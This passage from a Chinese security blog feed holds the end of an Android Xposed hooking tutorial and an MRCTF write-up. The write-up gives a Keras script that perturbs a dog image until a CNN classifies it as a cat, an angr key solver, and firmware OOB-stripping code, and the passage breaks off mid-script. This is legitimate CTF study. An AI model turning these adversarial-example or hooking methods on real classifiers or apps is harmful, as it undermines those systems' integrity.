(InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;com.fancy.tohook.cipher&quot;</span>);</span><br><span class="line">MyReiceiver myBroadcastReceiver = <span class="keyword">new</span> MyReiceiver();</span><br><span class="line"><span class="keyword">if</span>(ct==<span class="keyword">null</span>)&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;context is null&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//ct is the application context</span></span><br><span class="line">    ct.registerReceiver(myBroadcastReceiver, intentFilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用am命令指定该action发送广播：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast  -a com.fancy.tohook.cipher --include-stopped-packages --es type &quot;0&quot; --es msg &quot;2Jpg7LWBDy8TeZNy2KBWnjDDebA5kgNKWGQ3SzJfseXjViquEhKMAAQlI3smiQqfmsID2FuZ3OvUp0laB8DOY3UOxZdBsCyBIqzXhhlZ1+uCv/iBSQX5yfgRyxjtgXQwCq/ZmAkZ2SPvY3r2Q/mfBUmHvMgpAQJAGTlessJCXBnJfjT3R/1950ToS0w1xpXnIEYb7kMMF4SnqQNQ76BGWaLAvKfHc2O3B6a7YtmHoLbH8+Cl8h3TLi6zl9/YiGDdJGOn3ikijF2blKzjo5PjWzEf+imb8EJ9hq+D9C0qWAPfPwjxAT73GKgqKJR7lBjzqJ+pBg0uel8ud7geDVJ4G7s5wStZVVFpmW4EWplNG06ln8SWwj+v1t8Vo3hxGMIzqJSiWk3P1Fkt/y8Q7GaB9E5iv4rv5JLc6OpSqmEC74A744VF9kcL36LnVTwp7j04PtDdZzrD7i8qRZzX2sxG30QH/wDhu7fQSekkLzcVB1mDaxJzKi1JUBn8Aykseio/muzc4qiNb5VURBu5WsIT+SQpY0YVtKV2sBLJlQC7bj4Lo3KPrcvbklgg8EYPh0OhSHY2FozeKCR/ZLVngpqcL7nGJ7EsBJnxVjJO1F59pDc=&quot; --es key &quot;1234567890123456&quot;</span><br></pre></td></tr></table></figure><p>使用<code>adb logcat -d -s xxx_tag</code>获取目标函数返回内容。</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>对脚本语言或部分依赖虚拟机的语言的代码文件反编译可以得到比较理想的伪代码，并且代码量小、耦合度低的目标代码才能通过将其分离出来，正向开发的方式对其重用，这是很理想的场景；大部分的目标往往需要通过hook来实现目标代码重用，而这需要依赖于目标代码文件具备对应的可执行环境并且真正运行起来，可执行环境包括对应的硬件设备，所在的操作系统平台，甚至是某个版本，比如需要一台运行最新安卓系统的手机；能够运行起来还需要保证可执行文件所依赖的资源完整，比如一个apk包。</p><p>再延伸开去就涉及到虚拟机和模拟器的讨论，放到下篇讨论吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MRCTF</title>
    <link href="https://f4ncy.top/2022/05/05/MRCTF/"/>
    <id>https://f4ncy.top/2022/05/05/MRCTF/</id>
    <published>2022-05-05T12:21:45.000Z</published>
    <updated>2022-05-22T03:21:41.326Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h2 id="MISC-SPY-DOG"><a href="#MISC-SPY-DOG" class="headerlink" title="MISC:SPY_DOG"></a>MISC:SPY_DOG</h2><p>题目的逻辑是</p><p>提供狗的图片，需要处理图片，根据已知模型生成可以欺骗该模型，识别为猫的图片，这是一个对抗神经网络的白盒攻击任务。</p><p><a href="https://blog.csdn.net/u010420283/article/details/83685140?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5">https://blog.csdn.net/u010420283/article/details/83685140?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5</a></p><p>另外附带要求，生成伪造图片需要保证预测为cat的分值大于0.99，像素差值小于10。</p><p>这里介绍的是通过梯度下降的方式生成样本进行迭代，使用的是keras库。</p><p>通过模型可视化输出查看：</p><p>输入层（Input）：输入为128<em>128</em>3大小图像矩阵。</p><p>卷积层（Conv1）：32个126*126大小的卷积核。</p><p>Pooling层（Pool1）：Max Pooling窗口大小为2×2。</p><p>卷积层（Conv2）：32个63*63大小的卷积核。</p><p>Pooling层（Pool2）：Max Pooling窗口大小为2×2。</p><p>卷积层（Conv3）：64个30*30大小的卷积核。</p><p>Pooling层（Pool2）：Max Pooling窗口大小为2×2。</p><p>flatten层：一维化展开。</p><p>FC层（dense）:将展开的25088的map整合成512的map</p><p>输出层\FC层（dense_1）（output）:将512的map整合成2的map，即输出2个分类。</p><p>我们了解到这是一个4层的卷积神经网络模型，我们需要关注的是输入层和输出层，输入层是一个对128<em>128</em>3（长、宽、颜色通道）的图像处理层，输出层为输出2个神经节点（即是否为猫）：</p><p><img src="https://docimg6.docs.qq.com/image/2xYPw8XXIXhE6YhlFLNsfA.png?w=926&h=184" alt="img"><br>                                                                                。。。</p><p><img src="https://docimg1.docs.qq.com/image/vKmb0RXwoViLwzmXGjTZ_A.png?w=670&h=176" alt="img">        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mod</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> keras.applications <span class="keyword">import</span> inception_v3</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> plot_model</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> hashlib,random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> image_utils</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.compat.v1.disable_eager_execution()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkMask</span>(<span class="params">model, img</span>):</span></span><br><span class="line">    predict = model.predict(img)</span><br><span class="line">    <span class="keyword">return</span> predict[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Loading......&quot;</span>)</span><br><span class="line">model = load_model(<span class="string">&quot;./simplenn.model&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You are a spy from the country of dog, try your best to get flag from cats.&quot;</span>)</span><br><span class="line"><span class="comment">#plot_model(model, to_file=&#x27;./model.png&#x27;, show_shapes=True)</span></span><br><span class="line">layer_1 = K.function([model.layers[<span class="number">0</span>].<span class="built_in">input</span>], [model.layers[-<span class="number">1</span>].output])  <span class="comment"># 第一个 model.layers[0],不修改,表示输入数据；第二个model.layers[you wanted],修改为你需要输出的层数的编号</span></span><br><span class="line"><span class="comment"># img = image_utils.load_img(&quot;./another.bmp&quot;, target_size=(128, 128))</span></span><br><span class="line"><span class="comment"># img_tensor = image_utils.img_to_array(img)</span></span><br><span class="line"><span class="comment"># img_tensor /= 255.</span></span><br><span class="line"><span class="comment"># img_tensor -= 0.5</span></span><br><span class="line"><span class="comment"># img_tensor *= 2.</span></span><br><span class="line"><span class="comment"># img_tensor = np.expand_dims(img_tensor, axis=0)</span></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./another.bmp&quot;</span>)</span><br><span class="line">img = cv2.resize(img, (<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">img_tensor = np.expand_dims(img, axis=<span class="number">0</span>)</span><br><span class="line">img_tensor = img_tensor.astype(np.float32)</span><br><span class="line">img_tensor /= <span class="number">255.</span></span><br><span class="line"><span class="comment"># img = cv2.imread(&quot;./another.bmp&quot;)</span></span><br><span class="line"><span class="comment"># img = cv2.resize(img, (128, 128))</span></span><br><span class="line"><span class="comment"># img_tensor = np.expand_dims(img, axis=0)</span></span><br><span class="line"><span class="comment"># img_tensor = img_tensor.astype(np.float32)</span></span><br><span class="line"><span class="comment"># img_tensor /= 255.</span></span><br><span class="line">f1 = layer_1([img_tensor])[<span class="number">0</span>]  <span class="comment"># 只修改inpu_image,[:1]代表一张图片</span></span><br><span class="line"><span class="comment"># 第一层卷积后的特征图展示，输出是（样本个数，特征图尺寸长，特征图尺寸宽，特征图个数）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dog:&quot;</span>,f1[:,<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cat:&quot;</span>,f1[:,<span class="number">1</span>])       <span class="comment"># 样本个数，特征图尺寸长，特征图尺寸宽，特征图个数</span></span><br><span class="line"><span class="comment">#for _ in range(32):</span></span><br><span class="line">    <span class="comment"># show_img = f1[:, :, :, _]         # 样本个数，特征图尺寸长，特征图尺寸宽，特征图个数</span></span><br><span class="line">    <span class="comment"># print(&#x27;show_img&#x27;,show_img.shape)    # show_img (1, 22, 22)</span></span><br><span class="line">    <span class="comment"># show_img.shape = [126, 126]           # 跟show_img的形状一直</span></span><br><span class="line">    <span class="comment"># plt.subplot(4, 8, _ + 1)</span></span><br><span class="line">    <span class="comment"># plt.imshow(show_img, cmap=&#x27;gray&#x27;)</span></span><br><span class="line">    <span class="comment"># plt.axis(&#x27;off&#x27;)</span></span><br><span class="line"><span class="comment">#plt.show()</span></span><br><span class="line">max_change_above = img_tensor + <span class="number">0.039</span></span><br><span class="line">max_change_below = img_tensor - <span class="number">0.039</span></span><br><span class="line"><span class="comment"># Load pre-trained image recognition model</span></span><br><span class="line"><span class="comment">#model = inception_v3.InceptionV3()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Grab a reference to the first and last layer of the neural net</span></span><br><span class="line"><span class="comment"># print(&quot;model.layers:&quot;)</span></span><br><span class="line"><span class="comment"># print(model.layers)</span></span><br><span class="line">model_input_layer = model.layers[<span class="number">0</span>].<span class="built_in">input</span></span><br><span class="line">model_output_layer = model.layers[-<span class="number">1</span>].output</span><br><span class="line"><span class="comment"># print(&quot;model.layers[-1].output:&quot;)</span></span><br><span class="line"><span class="comment"># print(type(model_output_layer))</span></span><br><span class="line"><span class="comment"># sess = tf.compat.v1.InteractiveSession()</span></span><br><span class="line"><span class="comment"># sess.run(tf.compat.v1.global_variables_initializer())</span></span><br><span class="line"><span class="comment"># print(type(model_output_layer[0, 0].eval()))</span></span><br><span class="line"><span class="comment"># print(model_output_layer[0, 0].eval())</span></span><br><span class="line"><span class="comment"># print(model_output_layer[0, 1].eval())</span></span><br><span class="line">cost_function = model_output_layer[<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gradient_function = K.gradients(cost_function, model_input_layer)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#gradient_function= K.GradientTape(cost_function, model_input_layer)[0]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose an ImageNet object to fake</span></span><br><span class="line"><span class="comment"># The list of classes is available here: https://gist.github.com/ageitgey/4e1342c10a71981d0b491e1b8227328b</span></span><br><span class="line"><span class="comment"># Class #859 is &quot;toaster&quot;</span></span><br><span class="line"><span class="comment"># object_type_to_fake = 859</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Load the image to hack</span></span><br><span class="line"><span class="comment"># img = image.load_img(&quot;cat.png&quot;, target_size=(299, 299))</span></span><br><span class="line"><span class="comment"># original_image = image.img_to_array(img)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Scale the image so all pixel intensities are between [-1, 1] as the model expects</span></span><br><span class="line"><span class="comment"># original_image /= 255.</span></span><br><span class="line"><span class="comment"># original_image -= 0.5</span></span><br><span class="line"><span class="comment"># original_image *= 2.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Add a 4th dimension for batch size (as Keras expects)</span></span><br><span class="line"><span class="comment"># original_image = np.expand_dims(original_image, axis=0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pre-calculate the maximum change we will allow to the image</span></span><br><span class="line"><span class="comment"># We&#x27;ll make sure our hacked image never goes past this so it doesn&#x27;t look funny.</span></span><br><span class="line"><span class="comment"># A larger number produces an image faster but risks more distortion.</span></span><br><span class="line"><span class="comment"># max_change_above = original_image + 0.01</span></span><br><span class="line"><span class="comment"># max_change_below = original_image - 0.01</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a copy of the input image to hack on</span></span><br><span class="line"><span class="comment">#hacked_image = np.copy(original_image)</span></span><br><span class="line">hacked_image = np.copy(img_tensor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># How much to update the hacked image in each iteration</span></span><br><span class="line">learning_rate = <span class="number">0.1</span></span><br><span class="line"><span class="comment"># Define the cost function.</span></span><br><span class="line"><span class="comment"># Our &#x27;cost&#x27; will be the likelihood out image is the target class according to the pre-trained model</span></span><br><span class="line"><span class="comment">#cost_function = model_output_layer[0, object_type_to_fake]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># We&#x27;ll ask Keras to calculate the gradient based on the input image and the currently predicted class</span></span><br><span class="line"><span class="comment"># In this case, referring to &quot;model_input_layer&quot; will give us back image we are hacking.</span></span><br><span class="line"><span class="comment">#gradient_function = K.gradients(cost_function, model_input_layer)[0]</span></span><br><span class="line"><span class="comment"># Create a Keras function that we can call to calculate the current cost and gradient</span></span><br><span class="line">grab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])</span><br><span class="line">cost = <span class="number">0.0</span></span><br><span class="line"><span class="comment"># In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more</span></span><br><span class="line"><span class="comment"># until it gets to at least 80% confidence</span></span><br><span class="line"><span class="keyword">while</span> cost &lt; <span class="number">0.9994</span>:</span><br><span class="line">    <span class="comment"># Check how close the image is to our target class and grab the gradients we</span></span><br><span class="line">    <span class="comment"># can use to push it one more step in that direction.</span></span><br><span class="line">    <span class="comment"># Note: It&#x27;s really important to pass in &#x27;0&#x27; for the Keras learning mode here!</span></span><br><span class="line">    <span class="comment"># Keras layers behave differently in prediction vs. train modes!</span></span><br><span class="line">    cost,gradients = grab_cost_and_gradients_from_model([hacked_image, <span class="number">0</span>])</span><br><span class="line">    <span class="comment"># Move the hacked image one step further towards fooling the model</span></span><br><span class="line">    hacked_image += gradients * learning_rate</span><br><span class="line">    <span class="comment"># Ensure that the image doesn&#x27;t ever change too much to either look funny or to become an invalid image</span></span><br><span class="line">    hacked_image = np.clip(hacked_image, max_change_below, max_change_above)</span><br><span class="line">    <span class="comment">#hacked_image = np.clip(hacked_image, -1.0, 1.0)</span></span><br><span class="line">    img = hacked_image[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Model&#x27;s predicted likelihood that the image is a cat: &#123;:.8&#125;%&quot;</span>.<span class="built_in">format</span>(cost * <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># De-scale the image&#x27;s pixels from [-1, 1] back to the [0, 255] range</span></span><br><span class="line">img = hacked_image[<span class="number">0</span>]</span><br><span class="line">img *= <span class="number">255.</span></span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&quot;hacked-image2.bmp&quot;</span>,img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the hacked image!</span></span><br><span class="line"><span class="comment"># im = Image.fromarray(img.astype(np.uint8))</span></span><br><span class="line"><span class="comment"># im.save(&quot;hacked-image.bmp&quot;)</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;./hacked-image2.bmp&quot;</span></span><br><span class="line">score = <span class="number">0</span></span><br><span class="line">img = cv2.imread(filename)</span><br><span class="line">img = cv2.resize(img, (<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">img_tensor = np.expand_dims(img, axis=<span class="number">0</span>)</span><br><span class="line">img_tensor = img_tensor.astype(np.float32)</span><br><span class="line">img_tensor /= <span class="number">255.</span></span><br><span class="line">score=checkMask(model,img_tensor)</span><br><span class="line">cost,gradients = grab_cost_and_gradients_from_model([img_tensor, <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finaly cost:&quot;</span>,cost)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finaly score:&quot;</span>,score)</span><br></pre></td></tr></table></figure><p>将图片base64传上即可：<br><img src="https://docimg1.docs.qq.com/image/XtFgfrpcakjelIAzjiLQdA.png?w=1280&h=543.030303030303" alt="img">        </p><h2 id="RE-CICADA"><a href="#RE-CICADA" class="headerlink" title="RE:CICADA"></a>RE:CICADA</h2><p>SMC的题，dicada.exe会解密一个PE文件，验证逻辑在这个PE文件中，分析处理逻辑，流程是输入32字节key经过一个很长处理后,根据返回值是否为true来判断我们的输入是否正确，目前使用angr跑了出来.<br><img src="https://docimg4.docs.qq.com/image/n90Nv0VIE8viQ610zs3u9Q.png?w=1100&h=510" alt="img" style="zoom:0%;" align="middle"><br><img src="https://docimg1.docs.qq.com/image/AsZkKtkRbaaGubqXDKcqNA.png?w=803&h=456" alt="img" style="zoom:80%;" align="middle"><br><img src="https://docimg6.docs.qq.com/image/vE0Hhn72A1i3BQdGlomQlg.png?w=1038&h=547" alt="img" style="zoom:80%;" align="middle">        </p><p>angr脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./sub.exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># good = (0x18002536A)</span></span><br><span class="line"><span class="comment"># bad = (0x180025339)</span></span><br><span class="line">good = (<span class="number">0x18000BD6D</span>)</span><br><span class="line">bad = (<span class="number">0x18000BD79</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x18000bd43</span></span><br><span class="line"><span class="comment">#state = p.factory.entry_state()</span></span><br><span class="line">state = p.factory.blank_state(addr=start)</span><br><span class="line">state_rsp=state.regs.rsp</span><br><span class="line"><span class="built_in">print</span>(state_rsp)<span class="comment">#0x7ffffffffff0000</span></span><br><span class="line">state.regs.rcx=state_rsp+<span class="number">0x38</span></span><br><span class="line">state.regs.rdx=state.solver.BVS(<span class="string">&quot;lastbyte&quot;</span>,<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(state.regs.rcx)</span><br><span class="line">flag=state.solver.BVS(<span class="string">&quot;flag&quot;</span>,<span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line">state.memory.store(state_rsp+<span class="number">0x38</span>,flag,endless=p.arch.memory_endness)</span><br><span class="line">simulation = p.factory.simgr(state)</span><br><span class="line">simulation.explore(find=good, avoid=bad)</span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    hexflag=solution_state.solver.<span class="built_in">eval</span>(flag,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hexflag]))</span><br><span class="line">    <span class="comment"># for i in range(3):</span></span><br><span class="line">    <span class="comment">#     print (solution_state.posix.dumps(i))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://docimg4.docs.qq.com/image/XhGSw_617h8LRg9itFwW7w.png?w=576&h=67" alt="img"></p><h2 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h2><p>参考：</p><p><a href="http://www.ctfiot.com/37681.htmlhttp://www.ctfiot.com/37681.html">http://www.ctfiot.com/37681.htmlhttp://www.ctfiot.com/37681.html</a></p><p><a href="http://www.ctfiot.com/38677.htmlhttp://www.ctfiot.com/38677.html">http://www.ctfiot.com/38677.htmlhttp://www.ctfiot.com/38677.html</a></p><p>查看文件，PNF-9010R.img镜像文件被加密，我们需要分析S34MLxx固件获取密钥及加密逻辑。      <img src="https://docimg4.docs.qq.com/image/ReyKrrM8GcYyQ1LK1tRoow.png?w=770&h=148" alt="img"> </p><p><strong>Nand Flash</strong></p><p>NandFlash有特定的存储结构，可分为plane，block以及page。以Spansion S34ML0*为例，其由2快plane组成，每块plane由1024 block组成，每块block由64 page组成，每page有(2048 + 128)=2176字节。其中128字节为OOB区，用作校验和坏块管理，具体管理方式可参考该flash的datasheet。</p><blockquote><p>内部ECC对于主要区域的每528字节（x8）和备用区域的每16字节（x8）提供了9位检测码和8位校正码。[…] 在PROGRAM操作过程中，在页面被写入NAND Flash阵列之前，设备会在缓存寄存器中的2k页面上计算ECC代码。ECC代码被存储在页面的备用区域。 在读操作中，页面数据从阵列中被读到缓存寄存器中，在那里ECC代码被计算出来，并与从阵列中读取的ECC代码值进行比较。如果检测出1-8位的错误，将通过高速缓存寄存器进行纠正。只有经过纠正的数据，才会在I/O总线上输出。<br>通过编程器提取该flash固件，可得文件大小285,212,672字节=0x11000000字节=2(plane)*(1024block)*64(page)*2176(byte)，恰好符合datasheet描述。但需要注意的是，此时binwalk并不能有效识别该固件的组成及提取其中的文件系统。这是由于坏块以及OOB的存在，因此固件分析的第一步是筛选坏块并去除OOB区.<br>坏块筛选规则：the 1st byte in the spare area of the 1st or 2nd or last page does not contain FFh is a Bad block.<br>OOB去除，可去除每隔2048字节的128字节校验值。</p></blockquote><p>然而，经过上述操作后，binwalk仍不能正确提取识别。</p><p>初次经过人工分析，所有全0字节内存页中，有如下现象：页起始偏移1040字节的14字节有数据；OOB区的前两字节为FF，后14字节数据为全0。不经让人怀疑是上下两部分的数据区和校验区发生了调换。而事实也却是如此，具体需要了解yaffs2在(2k+128) NandFlash的存储结构以及uboot烧写的yaffs过程[1 2 3]。</p><p>NAND闪存是以内存页为单位进行编程和读取的。一个内存页由2048字节的可用存储空间和128字节的OOB组成，后者用于存储纠错代码和坏块管理的标志，也就是说，页面的总长度为2176字节。不过，对于擦除操作来说，则是以块为单位进行的。根据Micron公司的文档，对于这个闪存部分，一个块由64页组成，总共有128KB的可用数据。该闪存由两个面组成，每个面包含1024个块，因此： 2 planes * 1024 blocks/plane * 64 pages/block * (2048 + 128) bytes/page = 285,212,672</p><p>尝试每隔2048字节移除128字节，发现得到的固件文件仍然无法正常提取，分析发现oob的3-16字节是有用的：</p><p><img src="https://docimg3.docs.qq.com/image/y3hJZV7Q0mmdODBHusVYSw.png?w=1280&h=167.3846153846154" alt="img">        </p><p>另外，发现每个page偏倚0x410处存在14字节无意义<br><img src="https://docimg1.docs.qq.com/image/HQVjTQaim9QFdjTivw0kSg.png?w=1112&h=284" alt="img">        oob的格式与datasheet上介绍的不同。</p><p>删除修正后的oob：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">a=<span class="built_in">open</span>(<span class="string">r&#x27;S34ML02G200BHI00@BGA63_948.BIN&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">unOOBBin=<span class="built_in">open</span>(<span class="string">&#x27;unoob2.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">data=a.read()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">filesize=<span class="built_in">len</span>(data)</span><br><span class="line"><span class="keyword">while</span>(i&lt;filesize):</span><br><span class="line">    unOOBBin.write(data[i:i+<span 